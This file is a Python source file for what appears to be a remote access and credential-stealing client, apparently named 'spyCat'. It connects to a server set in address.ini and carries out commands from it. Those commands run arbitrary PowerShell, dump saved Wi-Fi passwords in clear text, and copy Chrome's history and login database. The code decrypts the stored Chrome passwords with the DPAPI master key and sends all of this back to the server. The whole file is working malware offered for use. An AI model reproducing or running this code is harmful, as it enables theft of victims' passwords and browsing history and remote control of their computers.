import base64
import shutil
import socket
import selectors
import subprocess
import sys
import time
import struct
import json
import traceback
import chardet
import pandas as pd
import os
import sqlite3
import win32crypt
import psutil
import configparser
from Crypto.Cipher import AES


class Client:
    def __init__(self, ADDRESS:tuple[str, int]) -> None:
        self.ADDRESS = ADDRESS
        self.alive = False

    def connect(self):
        self.sel = selectors.DefaultSelector()
        self.clientSocket = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)  # IPV4|TCP
        try: 
            self.clientSocket.connect(self.ADDRESS)
        except socket.error as err:
            self.alive = False
            print("[Client](connect):", err)
        else: 
            self.clientSocket.setblocking(False)
            packet = ClientPacket(self.clientSocket, self.ADDRESS, self.sel)
            self.sel.register(fileobj=self.clientSocket, events=selectors.EVENT_READ | selectors.EVENT_WRITE, data=packet)
            self.alive = True
            self.startEventLoop()

    def startEventLoop(self):
        while self.alive:
            events = self.sel.select(timeout=1)
            for key, mask in events:
                packet = key.data
                try:
                    packet.handleConn(mask)
                except Exception as err:
                    self.alive = False
                    packet.closeConn()
                    print(traceback.format_exc())
                    print("[Client](startEventLoop):", err)
            if not self.sel.get_map():  # must Check for a socket being monitored to continue.
                break
        # cleanUp
        self.sel.close()
        
class ClientPacket:
    def __init__(self, clientSocket: socket.socket, serverAddress: tuple, sel: selectors.DefaultSelector) -> None:
        self.clientSocket = clientSocket
        self.address = serverAddress
        self.sel = sel

        self.BUFFER_SIZE = 4096
        self.sendBuffer = bytearray()
        self.recvBuffer = bytearray()

        self.packetHeaderSize = None
        self.packetHeader = None
        self.dataSize = None

    def handleConn(self, mask: int):
        if mask & selectors.EVENT_READ:
            self.readPacket()
        if mask & selectors.EVENT_WRITE:
            self.writePacket()

    def closeConn(self):
        try:
            self.sel.unregister(self.clientSocket)
        except Exception as err:
            print("[ClientPacket](closeConn)> Error:", err)

        try:
            self.clientSocket.close()
        except OSError as err:
            print("[ClientPacket](closeConn)> Error:", err)
        finally:
            self.clientSocket = None

    def readPacket(self):
        self.recvIt()
        if self.recvBuffer:
            if self.packetHeaderSize is None:
                self.getPacketHeaderSize()
            if self.packetHeaderSize is not None:
                if len(self.recvBuffer) >= self.packetHeaderSize:
                    if self.packetHeader is None:
                        self.getPacketHeader()
            if self.dataSize is not None:
                if len(self.recvBuffer) >= self.dataSize:
                    self.getPacket()
                    # Set selector to listen for write events, we're done reading.
                    self.sel.modify(self.clientSocket, events=selectors.EVENT_WRITE, data=self)

    def recvIt(self):
        try:
            chunk = self.clientSocket.recv(self.BUFFER_SIZE)
            if chunk:
                self.recvBuffer.extend(chunk)
            else:
                self.closeConn()
        except BlockingIOError:
            pass  # Resource temporarily unavailable (errno EWOULDBLOCK)
        except OSError as err:  # expecting [WinError 10054] (client forcibly closed connection)
            raise OSError(f"[Packet](recvIt):", err)

    def getPacketHeaderSize(self):
        self.packetHeaderSize = struct.unpack('>H', self.recvBuffer[:2])[0]
        self.recvBuffer = self.recvBuffer[2:]

    def getPacketHeader(self):
        headerBytes = self.recvBuffer[:self.packetHeaderSize]
        self.packetHeader = json.loads(headerBytes)
        self.dataSize = self.packetHeader["size"]
        self.recvBuffer = self.recvBuffer[self.packetHeaderSize:]

    def getPacket(self):
        data = self.recvBuffer[:self.dataSize]
        packetBody = data.decode(self.packetHeader["encoding"])
        self.processPacket(packetBody)
        self.recvBuffer = self.recvBuffer[self.dataSize:]
        self.packetHeaderSize = None
        self.packetHeader = None
        self.dataSize = None
    
    def processPacket(self, data: any):
        if self.packetHeader["type"] == 'str':
            if data == 'getHostName':
                hostName = socket.gethostname().encode('utf-8')
                hostNameEncoding = chardet.detect(hostName)['encoding']
                self.createPacket(dataType="str", data=hostName, cmdInfo="hostname", encoding=hostNameEncoding)

        if self.packetHeader["type"] == 'json':
            data = json.loads(data)
            cmd, args= data
            cmd = cmd.lower()
            if cmd == 'freeclient':
                self.closeConn()
                sys.exit()
            if cmd == 'ps':
                result = self.runPS(args['psfile'])
                if result:
                    result = result.encode('utf-8')
                    self.createPacket(dataType="str", data=result, cmdInfo='ps', encoding='utf-8')
            if cmd == 'getwifidump':
                result = self.getWifiDump()
                if result:
                    result = result.encode('utf-8')
                    self.createPacket(dataType="str", data=result, cmdInfo='getwifidump', encoding='utf-8')
            if cmd == 'getchromedump':
                result = self.getChromeDump()
                if result:
                    result = result.encode('utf-8')
                    self.createPacket(dataType="str", data=result, cmdInfo='getchromedump', encoding='utf-8')

    @staticmethod
    def runPS(psCmd: str) -> str:
        try:
            result = subprocess.run(["powershell", psCmd], 
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE, 
                                    text=True)
            if result.stdout:
                return result.stdout
            if result.stderr:
                return result.stderr
        except subprocess.CalledProcessError as err:
            return err

    def getWifiDump(self):
        result = self.runPS('''
                    (netsh wlan show profiles) | 
                    Select-String "\:(.+)$" | 
                    %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | 
                    %{(netsh wlan show profile name="$name" key=clear)} | 
                    Select-String "Key Content\W+\:(.+)$" | 
                    %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | 
                    %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | 
                    Format-List
                    ''')
        return result

    @staticmethod
    def decrypt_password(buff):
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r") as f:
            local_state = f.read()
            local_state = json.loads(local_state)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]  # removing DPAPI
            master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
            return decrypted_pass
        except Exception:
            return ""

    def getChromeDump(self) -> str:
        chromeDataPath = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default'
        if os.path.exists(chromeDataPath):
            historyPath = chromeDataPath + r"\_History.db"
            loginPath = chromeDataPath + r"\_Login_Data.db"
            shutil.copy2(chromeDataPath + r"\History", historyPath)
            shutil.copy2(chromeDataPath + r"\Login Data", loginPath)
            ########## history
            conn = sqlite3.connect(historyPath)
            cursor = conn.cursor()
            cursor.execute("""SELECT datetime(last_visit_time/1000000-11644473600,'unixepoch','localtime'), url 
                                FROM urls 
                                ORDER BY last_visit_time DESC LIMIT 50""")
            data = cursor.fetchall()
            history = pd.DataFrame(data, columns=['last_visit_time', 'url'])
            history = history.to_html(index=False)
            ########## credentials
            conn = sqlite3.connect(loginPath)
            cursor = conn.cursor()
            cursor.execute("""SELECT datetime(date_created/1000000-11644473600,'unixepoch','localtime'), 
                                    origin_url,
                                    username_value, 
                                    password_value 
                                    from logins""")
            data = cursor.fetchall()
            credentials = pd.DataFrame(data, columns=['date_created', 'origin_url', 'username_value', 'password_value'])
            credentials['password_value'] = credentials['password_value'].apply(lambda password: self.decrypt_password(password))
            credentials = credentials.to_html(index=False)
            ######### queue
            chromeDump = f'''{header}\n<p><b>[last 50 visited urls]</b></p>\n{history}\n<p><b>[all stored credentials]</b></p>\n{credentials}\n</body></html>'''
            return chromeDump
        else:
            return 'chrome is not installed in this machine'

    def writePacket(self):
        if self.sendBuffer:
            self.sendIt()
        if not self.sendBuffer:
            # Set socket to listen for read events, we're done writing.
            self.sel.modify(fileobj=self.clientSocket, events=selectors.EVENT_READ, data=self)

    def sendIt(self):
        try:
            bytesSent = self.clientSocket.send(self.sendBuffer)
            self.sendBuffer = self.sendBuffer[bytesSent:]
        except BlockingIOError:
            pass  # Resource temporarily unavailable (errno EWOULDBLOCK)
        except OSError as err:  # expecting [WinError 10054] (client forcibly closed connection)
            raise OSError(f"[Packet](sendIt):", err)

    def createPacket(self, dataType: str, data: bytes, cmdInfo: str='', encoding: str='utf-8'):
        # create jsonHeader
        header = json.dumps({"size": len(data), "type": dataType, "cmdInfo": cmdInfo, "encoding": encoding}).encode()
        headerSize = struct.pack('>H', len(header))
        self.sendBuffer = headerSize + header + data


header = """
<html>
<head>
<style>
    table, th, td {
        border: 1px solid rgb(52, 116, 208);
        border-collapse: collapse;
    }
    th, td {
        padding: 5px;
        text-align: left;
        font-family: Helvetica, Arial, sans-serif;
        font-size: 90%;
    }
    .wide {
        width: 90%; 
    }
</style>
</head>
<body>
            """


if __name__== "__main__":
    spyCatFileName = os.path.basename(__file__)
    for process in psutil.process_iter():
        if process.name() == spyCatFileName:
            sys.exit()

    if os.path.exists("address.ini"):
        config = configparser.ConfigParser()
        config.read('address.ini')
        ip = config.get('server', 'ip')
        port = config.get('server', 'port')
        if ip == '0':
            address = (socket.gethostbyname(socket.gethostname()), 63999)
        else:
            address = (ip, int(port))

        client = Client(address)
        while True:
            client.connect()
            time.sleep(3)